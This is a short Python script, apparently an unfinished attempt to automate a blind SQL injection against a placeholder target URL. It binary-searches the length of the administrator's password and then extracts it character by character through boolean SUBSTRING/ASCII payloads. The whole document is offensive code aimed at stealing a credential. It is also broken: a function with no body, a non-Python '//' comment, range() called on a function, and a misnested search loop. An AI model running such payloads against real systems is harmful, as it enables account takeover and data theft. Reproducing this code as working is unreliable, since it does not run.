import sys
import requests

url = "https://target-url.url"

def send_payload(payload):
    successfull_condition = "Welcome back!"

    

def find_password_length():
    low = 1
    high = 100

    while(low < high):
        mid = (low + high) // 2

        payload = f"SELECT LENGTH(password) FROM users WHERE username = 'administrator' > {mid}"
    
        // send_payload(payload)


def blind_sqli_automatized(send_payload):
    low = 32
    high = 126

    while(low < high):
        mid = (low + high) // 2

        found_password = ""

        for i in range(find_password_length):
            payload = f"ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1)) > {mid}"
            
            if(send_payload(payload)):
                low = mid + 1
            else:
                high = mid

            found_password += chr(low)
            continue


